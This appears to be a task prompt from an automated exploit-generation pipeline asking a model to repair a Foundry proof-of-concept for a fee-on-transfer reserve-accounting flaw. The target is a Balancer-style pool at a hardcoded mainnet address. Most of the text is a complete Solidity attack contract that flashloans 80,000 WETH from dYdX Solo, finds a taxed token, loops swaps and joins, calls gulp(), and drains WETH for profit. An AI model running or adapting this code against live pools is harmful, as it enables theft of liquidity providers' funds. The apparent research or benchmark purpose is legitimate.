You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Nominal reserve accounting breaks with fee-on-transfer, deflationary, or rebasing tokens and can be crystallized with `gulp()`
- claim: The pool updates `_records[token].balance` from nominal trade/join/rebind amounts instead of the token balance delta actually received by the pool, and `gulp()` later overwrites the recorded balance from `balanceOf(address(this))`. For fee-on-transfer, deflationary, or negative-rebasing tokens, recorded reserves can drift materially from real reserves, so subsequent swap pricing and BPT mint/burn math operate on false balances.
- impact: Attackers can exploit the reserve mismatch to extract disproportionate amounts of honest assets or overmint BPT at LPs' expense. This is especially dangerous when a taxed/deflationary token is repeatedly traded or joined with and the mismatch is later realized through `gulp()` or subsequent swaps/exits.
- exploit_paths: ["`rebind()` stores the requested `balance` before `_pullUnderlying()` verifies what was actually received", "`joinPool()`, `swapExactAmountIn()`, `swapExactAmountOut()`, `joinswapExternAmountIn()`, and `joinswapPoolAmountOut()` all mutate internal balances by the nominal input amount before relying on the token transfer", "`gulp()` permissionlessly resets the internal balance to `IERC20(token).balanceOf(address(this))`, crystallizing earlier drift into pool pricing"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.26;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IBPool is IERC20 {
    function isFinalized() external view returns (bool);
    function getCurrentTokens() external view returns (address[] memory);
    function getBalance(address token) external view returns (uint256);
    function getController() external view returns (address);
    function joinPool(uint256 poolAmountOut, uint256[] calldata maxAmountsIn) external;
    function exitPool(uint256 poolAmountIn, uint256[] calldata minAmountsOut) external;
    function swapExactAmountIn(address tokenIn, uint256 tokenAmountIn, address tokenOut, uint256 minAmountOut, uint256 maxPrice) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
    function swapExactAmountOut(address tokenIn, uint256 maxAmountIn, address tokenOut, uint256 tokenAmountOut, uint256 maxPrice) external returns (uint256 tokenAmountIn, uint256 spotPriceAfter);
    function joinswapExternAmountIn(address tokenIn, uint256 tokenAmountIn, uint256 minPoolAmountOut) external returns (uint256 poolAmountOut);
    function joinswapPoolAmountOut(address tokenIn, uint256 poolAmountOut, uint256 maxAmountIn) external returns (uint256 tokenAmountIn);
    function gulp(address token) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
    function swapTokensForExactTokens(uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

library Account {
    struct Info {
        address owner;
        uint256 number;
    }
}

library Types {
    enum AssetDenomination {
        Wei,
        Par
    }

    enum AssetReference {
        Delta,
        Target
    }

    struct AssetAmount {
        bool sign;
        AssetDenomination denomination;
        AssetReference ref;
        uint256 value;
    }
}

library Actions {
    enum ActionType {
        Deposit,
        Withdraw,
        Transfer,
        Buy,
        Sell,
        Trade,
        Liquidate,
        Vaporize,
        Call
    }

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        Types.AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }
}

interface ISoloMargin {
    function getNumMarkets() external view returns (uint256);
    function getMarketTokenAddress(uint256 marketId) external view returns (address);
    function operate(Account.Info[] calldata accounts, Actions.ActionArgs[] calldata actions) external;
}

interface ICallee {
    function callFunction(address sender, Account.Info calldata account, bytes calldata data) external;
}

contract ProbeSink {
    function tokenBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }
}

contract FlawVerifier is ICallee {
    uint256 private constant BONE = 1e18;
    address private constant TARGET_POOL = 0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SOLO = 0x1e0447B19Bb6eCfDA50F058b761e27810Ee1a2D7;

    IBPool private constant POOL = IBPool(TARGET_POOL);
    IWETH private constant WETH_TOKEN = IWETH(WETH);
    IUniswapV2Router02 private constant ROUTER = IUniswapV2Router02(UNISWAP_V2_ROUTER);
    ISoloMargin private constant SOLO_MARGIN = ISoloMargin(SOLO);

    ProbeSink private immutable PROBE_SINK;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private inFlash;
    uint256 private flashStartingWeth;

    constructor() {
        PROBE_SINK = new ProbeSink();
        _profitToken = WETH;
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitToken = WETH;
        _profitAmount = 0;

        if (_wethBalance() > 0) {
            uint256 beforeBalance = _wethBalance();
            try this.executeWithCurrentBalance() {
                uint256 afterBalance = _wethBalance();
                if (afterBalance > beforeBalance) {
                    _profitAmount = afterBalance - beforeBalance;
                    return;
                }
            } catch {}
        }

        _executeViaSoloFlashloan();
    }

    function executeWithCurrentBalance() external {
        require(msg.sender == address(this), "SELF_ONLY");
        uint256 startingWeth = _wethBalance();
        _runExploit(startingWeth, false);
        uint256 endingWeth = _wethBalance();
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
        }
    }

    function callFunction(address sender, Account.Info calldata, bytes calldata data) external override {
        require(msg.sender == SOLO, "SOLO_ONLY");
        require(sender == address(this), "BAD_SENDER");
        require(inFlash, "NOT_FLASHING");

        (uint256 repayAmount) = abi.decode(data, (uint256));
        _runExploit(flashStartingWeth, true);
        _safeApprove(WETH, SOLO, type(uint256).max);
        require(_wethBalance() >= repayAmount, "INSUFFICIENT_FOR_REPAY");
    }

    function _executeViaSoloFlashloan() internal {
        uint256 marketId = _findSoloMarketId(WETH);
        uint256 loanAmount = 80_000 ether;

        flashStartingWeth = _wethBalance();
        inFlash = true;

        Account.Info[] memory accounts = new Account.Info[](1);
        accounts[0] = Account.Info({owner: address(this), number: 0});

        Actions.ActionArgs[] memory actions = new Actions.ActionArgs[](3);
        actions[0] = _withdraw(marketId, loanAmount);
        actions[1] = _call(abi.encode(loanAmount + 2));
        actions[2] = _deposit(marketId, loanAmount + 2);

        _safeApprove(WETH, SOLO, type(uint256).max);
        SOLO_MARGIN.operate(accounts, actions);
        inFlash = false;

        uint256 endingWeth = _wethBalance();
        if (endingWeth > flashStartingWeth) {
            _profitAmount = endingWeth - flashStartingWeth;
        }
    }

    function _runExploit(uint256 startingWeth, bool fromFlash) internal {
        address[] memory tokens = POOL.getCurrentTokens();
        require(tokens.length >= 2, "POOL_TOO_SMALL");

        // `rebind()` is mechanically infeasible for this verifier unless the contract is both controller
        // and the pool is unfinalized. This target exploit path is aimed at a live public pool, so the
        // verifier proves the public finalized paths and documents this controller-only branch explicitly.
        if (!POOL.isFinalized()) {
            require(POOL.getController() == address(this), "REBIND_REQUIRES_CONTROLLER");
        }

        _approvePoolAndRouter(tokens);

        address taxedToken = _findTaxedToken(tokens);
        require(taxedToken != address(0), "NO_FEE_ON_TRANSFER_TOKEN_DETECTED");

        if (_wethBalance() > 0) {
            uint256 seedSpend = (_wethBalance() * 65) / 100;
            if (seedSpend > 0) {
                _buyTokenExactIn(taxedToken, seedSpend);
            }
        }

        _attemptJoinPoolDust(tokens, taxedToken);
        _attemptSwapExactAmountInLoops(taxedToken);
        _attemptSwapExactAmountOut(taxedToken);
        _attemptJoinSwapExternAmountIn(taxedToken);
        _attemptJoinSwapPoolAmountOut(taxedToken);

        POOL.gulp(taxedToken);

        _attemptFinalTaxedToWethDrains(taxedToken);
        _exitAnyBpt(tokens);
        _convertResidualsToWeth(tokens, taxedToken);

        if (fromFlash) {
            require(_wethBalance() > startingWeth + 2, "NO_NET_WETH_FROM_FLASH_PATH");
        }
    }

    function _attemptJoinPoolDust(address[] memory tokens, address taxedToken) internal {
        uint256 poolTotal = POOL.totalSupply();
        uint256 poolAmountOut = poolTotal / 1_000_000;
        if (poolAmountOut == 0) {
            poolAmountOut = 1;
        }

        uint256[] memory maxAmountsIn = new uint256[](tokens.length);
        bool feasible = true;

        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 bal = POOL.getBalance(tokens[i]);
            uint256 amountIn = ((poolAmountOut * bal) / poolTotal) + 10;
            if (amountIn == 0) {
                amountIn = 1;
            }
            maxAmountsIn[i] = amountIn * 2;

            if (tokens[i] == WETH) {
                continue;
            }

            uint256 have = IERC20(tokens[i]).balanceOf(address(this));
            if (have >= maxAmountsIn[i]) {
                continue;
            }

            uint256 need = maxAmountsIn[i] - have;
            if (tokens[i] == taxedToken) {
                uint256 budget = _wethBalance() / 20;
                if (budget == 0) {
                    feasible = false;
                    break;
                }
                _buyTokenExactIn(tokens[i], budget);
                if (IERC20(tokens[i]).balanceOf(address(this)) < maxAmountsIn[i]) {
                    feasible = false;
                    break;
                }
            } else {
                if (!_buyTokenExactOut(tokens[i], need, _wethBalance() / 10)) {
                    feasible = false;
                    break;
                }
            }
        }

        // If any bound asset lacks a simple public WETH route on this fork, the verifier treats
        // `joinPool()` as concretely infeasible for this minimal execution path and skips it.
        if (!feasible) {
            return;
        }

        try POOL.joinPool(poolAmountOut, maxAmountsIn) {} catch {}
    }

    function _attemptSwapExactAmountInLoops(address taxedToken) internal {
        for (uint256 i = 0; i < 12; i++) {
            uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
            uint256 poolTaxed = POOL.getBalance(taxedToken);
            if (ourTaxed == 0 || poolTaxed <= 2) {
                break;
            }

            uint256 maxAllowed = (poolTaxed / 2) - 1;
            if (maxAllowed == 0) {
                break;
            }

            uint256 amountIn = ourTaxed / 3;
            if (amountIn == 0 || amountIn > maxAllowed) {
                amountIn = maxAllowed;
            }
            if (amountIn == 0) {
                break;
            }

            try POOL.swapExactAmountIn(taxedToken, amountIn, WETH, 1, type(uint256).max) returns (uint256, uint256) {
                uint256 recycle = _wethBalance() / 4;
                if (recycle > 0) {
                    _buyTokenExactIn(taxedToken, recycle);
                }
            } catch {
                break;
            }
        }
    }

    function _attemptSwapExactAmountOut(address taxedToken) internal {
        uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
        uint256 poolTaxed = POOL.getBalance(taxedToken);
        uint256 poolWeth = POOL.getBalance(WETH);
        if (ourTaxed == 0 || poolTaxed <= 2 || poolWeth == 0) {
            return;
        }

        uint256 maxAmountIn = ourTaxed / 5;
        uint256 maxAllowed = (poolTaxed / 2) - 1;
        if (maxAmountIn == 0 || maxAmountIn > maxAllowed) {
            maxAmountIn = maxAllowed;
        }
        if (maxAmountIn == 0) {
            return;
        }

        uint256 tokenAmountOut = poolWeth / 10_000;
        if (tokenAmountOut == 0) {
            tokenAmountOut = 1;
        }

        try POOL.swapExactAmountOut(taxedToken, maxAmountIn, WETH, tokenAmountOut, type(uint256).max) returns (uint256, uint256) {} catch {}
    }

    function _attemptJoinSwapExternAmountIn(address taxedToken) internal {
        uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
        uint256 poolTaxed = POOL.getBalance(taxedToken);
        if (ourTaxed == 0 || poolTaxed <= 2) {
            return;
        }

        uint256 tokenAmountIn = ourTaxed / 6;
        uint256 maxAllowed = (poolTaxed / 2) - 1;
        if (tokenAmountIn == 0 || tokenAmountIn > maxAllowed) {
            tokenAmountIn = maxAllowed;
        }
        if (tokenAmountIn == 0) {
            return;
        }

        try POOL.joinswapExternAmountIn(taxedToken, tokenAmountIn, 1) returns (uint256) {} catch {}
    }

    function _attemptJoinSwapPoolAmountOut(address taxedToken) internal {
        uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
        if (ourTaxed == 0) {
            return;
        }

        uint256 poolAmountOut = POOL.totalSupply() / 10_000_000;
        if (poolAmountOut == 0) {
            poolAmountOut = 1;
        }

        try POOL.joinswapPoolAmountOut(taxedToken, poolAmountOut, ourTaxed) returns (uint256) {} catch {}
    }

    function _attemptFinalTaxedToWethDrains(address taxedToken) internal {
        for (uint256 i = 0; i < 6; i++) {
            uint256 ourTaxed = IERC20(taxedToken).balanceOf(address(this));
            uint256 poolTaxed = POOL.getBalance(taxedToken);
            if (ourTaxed == 0 || poolTaxed <= 2) {
                break;
            }

            uint256 maxAllowed = (poolTaxed / 2) - 1;
            if (maxAllowed == 0) {
                break;
            }

            uint256 amountIn = ourTaxed;
            if (amountIn > maxAllowed) {
                amountIn = maxAllowed;
            }
            if (amountIn == 0) {
                break;
            }

            try POOL.swapExactAmountIn(taxedToken, amountIn, WETH, 1, type(uint256).max) returns (uint256, uint256) {} catch {
                break;
            }
        }
    }

    function _exitAnyBpt(address[] memory tokens) internal {
        uint256 bptBal = POOL.balanceOf(address(this));
        if (bptBal == 0) {
            return;
        }

        uint256[] memory mins = new uint256[](tokens.length);
        try POOL.exitPool(bptBal, mins) {} catch {}
    }

    function _convertResidualsToWeth(address[] memory tokens, address taxedToken) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == WETH) {
                continue;
            }

            uint256 bal = IERC20(token).balanceOf(address(this));
            if (bal == 0) {
                continue;
            }

            if (token == taxedToken) {
                _sellFeeOnTransferTokenToWeth(token, bal);
            } else {
                _sellTokenToWeth(token, bal);
            }
        }
    }

    function _findTaxedToken(address[] memory tokens) internal returns (address taxedToken) {
        uint256 bestLoss;
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == WETH) {
                continue;
            }

            uint256 budget = _wethBalance() / 200;
            if (budget == 0) {
                budget = 1e15;
            }
            if (_wethBalance() < budget) {
                continue;
            }

            uint256 beforeBuy = IERC20(token).balanceOf(address(this));
            try ROUTER.swapExactTokensForTokens(budget, 1, _path(WETH, token), address(this), block.timestamp) returns (uint256[] memory) {
                uint256 acquired = IERC20(token).balanceOf(address(this)) - beforeBuy;
                if (acquired == 0) {
                    continue;
                }

                uint256 probe = acquired / 5;
                if (probe == 0) {
                    probe = acquired;
                }

                uint256 sinkBefore = IERC20(token).balanceOf(address(PROBE_SINK));
                _safeTransfer(token, address(PROBE_SINK), probe);
                uint256 sinkDelta = IERC20(token).balanceOf(address(PROBE_SINK)) - sinkBefore;
                if (sinkDelta < probe) {
                    uint256 loss = probe - sinkDelta;
                    if (loss > bestLoss) {
                        bestLoss = loss;
                        taxedToken = token;
                    }
                }
            } catch {}
        }
    }

    function _buyTokenExactIn(address tokenOut, uint256 wethAmountIn) internal returns (uint256 received) {
        if (wethAmountIn == 0) {
            return 0;
        }
        uint256 beforeBal = IERC20(tokenOut).balanceOf(address(this));
        try ROUTER.swapExactTokensForTokens(wethAmountIn, 1, _path(WETH, tokenOut), address(this), block.timestamp) returns (uint256[] memory) {
            received = IERC20(tokenOut).balanceOf(address(this)) - beforeBal;
        } catch {
            received = 0;
        }
    }

    function _buyTokenExactOut(address tokenOut, uint256 amountOut, uint256 maxWethIn) internal returns (bool ok) {
        if (amountOut == 0 || maxWethIn == 0 || _wethBalance() == 0) {
            return false;
        }
        if (maxWethIn > _wethBalance()) {
            maxWethIn = _wethBalance();
        }
        try ROUTER.swapTokensForExactTokens(amountOut, maxWethIn, _path(WETH, tokenOut), address(this), block.timestamp) returns (uint256[] memory) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function _sellTokenToWeth(address tokenIn, uint256 amountIn) internal {
        try ROUTER.swapExactTokensForTokens(amountIn, 1, _path(tokenIn, WETH), address(this), block.timestamp) returns (uint256[] memory) {} catch {}
    }

    function _sellFeeOnTransferTokenToWeth(address tokenIn, uint256 amountIn) internal {
        try ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 1, _path(tokenIn, WETH), address(this), block.timestamp) {} catch {}
    }

    function _approvePoolAndRouter(address[] memory tokens) internal {
        _safeApprove(WETH, TARGET_POOL, type(uint256).max);
        _safeApprove(WETH, UNISWAP_V2_ROUTER, type(uint256).max);
        _safeApprove(address(POOL), TARGET_POOL, type(uint256).max);

        for (uint256 i = 0; i < tokens.length; i++) {
            _safeApprove(tokens[i], TARGET_POOL, type(uint256).max);
            _safeApprove(tokens[i], UNISWAP_V2_ROUTER, type(uint256).max);
        }
    }

    function _findSoloMarketId(address token) internal view returns (uint256 marketId) {
        uint256 numMarkets = SOLO_MARGIN.getNumMarkets();
        for (uint256 i = 0; i < numMarkets; i++) {
            if (SOLO_MARGIN.getMarketTokenAddress(i) == token) {
                return i;
            }
        }
        revert("SOLO_MARKET_NOT_FOUND");
    }

    function _withdraw(uint256 marketId, uint256 amount) internal view returns (Actions.ActionArgs memory) {
        Types.AssetAmount memory amt = Types.AssetAmount({sign: false, denomination: Types.AssetDenomination.Wei, ref: Types.AssetReference.Delta, value: amount});

        return
            Actions.ActionArgs({
                actionType: Actions.ActionType.Withdraw,
                accountId: 0,
                amount: amt,
                primaryMarketId: marketId,
                secondaryMarketId: 0,
                otherAddress: address(this),
                otherAccountId: 0,
                data: ""
            });
    }

    function _call(bytes memory data) internal view returns (Actions.ActionArgs memory) {
        Types.AssetAmount memory amt = Types.AssetAmount({sign: false, denomination: Types.AssetDenomination.Wei, ref: Types.AssetReference.Delta, value: 0});

        return
            Actions.ActionArgs({
                actionType: Actions.ActionType.Call,
                accountId: 0,
                amount: amt,
                primaryMarketId: 0,
                secondaryMarketId: 0,
                otherAddress: address(this),
                otherAccountId: 0,
                data: data
            });
    }

    function _deposit(uint256 marketId, uint256 amount) internal view returns (Actions.ActionArgs memory) {
        Types.AssetAmount memory amt = Types.AssetAmount({sign: true, denomination: Types.AssetDenomination.Wei, ref: Types.AssetReference.Delta, value: amount});

        return
            Actions.ActionArgs({
                actionType: Actions.ActionType.Deposit,
                accountId: 0,
                amount: amt,
                primaryMarketId: marketId,
                secondaryMarketId: 0,
                otherAddress: address(this),
                otherAccountId: 0,
                data: ""
            });
    }

    function _path(address a, address b) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = a;
        path[1] = b;
    }

    function _wethBalance() internal view returns (uint256) {
        return IERC20(WETH).balanceOf(address(this));
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        if (ok && (data.length == 0 || abi.decode(data, (bool)))) {
            return;
        }

        (ok, data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_RESET_FAILED");
        (ok, data) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: _pullunderlying(), swapexactamountin(), swapexactamountout(), joinswapexternamountin(), joinswappoolamountout(), gulp()
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
